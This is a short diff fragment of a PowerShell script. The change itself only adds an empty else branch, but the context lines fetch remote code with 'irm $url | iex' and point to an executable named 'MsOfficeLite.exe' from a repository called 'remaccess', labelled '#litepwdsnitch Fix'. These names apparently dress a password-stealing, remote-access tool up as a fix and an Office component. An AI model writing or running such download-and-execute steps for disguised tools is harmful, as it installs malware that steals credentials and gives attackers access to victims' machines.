@@ -29,6 +29,8 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing $Name Fix..."
     powershell.exe irm $url | iex
+    } else {
+}
 #litepwdsnitch Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
